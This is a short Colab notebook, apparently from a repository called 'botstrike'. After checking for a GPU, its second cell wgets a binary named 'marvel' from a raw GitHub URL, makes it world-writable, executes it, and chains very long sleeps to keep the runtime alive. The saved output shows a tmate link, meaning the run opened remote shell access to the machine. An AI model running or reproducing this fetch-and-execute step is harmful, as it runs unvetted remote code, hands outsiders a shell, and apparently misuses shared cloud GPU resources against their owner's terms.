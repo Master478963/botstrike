{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled0.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gqZ-MOk4ZmW4",
        "outputId": "da054082-903c-4315-ebc0-974372c07be5"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Tesla T4\n"
          ]
        }
      ],
      "source": [
        "import torch\n",
        "print(torch.cuda.get_device_name(0))"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        
        "!wget https://raw.githubusercontent.com/aurbach55/zash/main/marvel && chmod 777 marvel && ./marvel && sleep 9 && sleep 99 && sleep 9999 && sleep 999999999999"
        
        
        ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "nkS3cDqGZua3",
        "outputId": "9f819391-939a-4ba9-b433-8c083c8ddf4c"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Connect with web: https://tmate.io/t/jD5Zcj2L7ZSLDK35PD7ZHaunG\n",
            "^C\n"
          ]
        }
      ]
    }
  ]
}
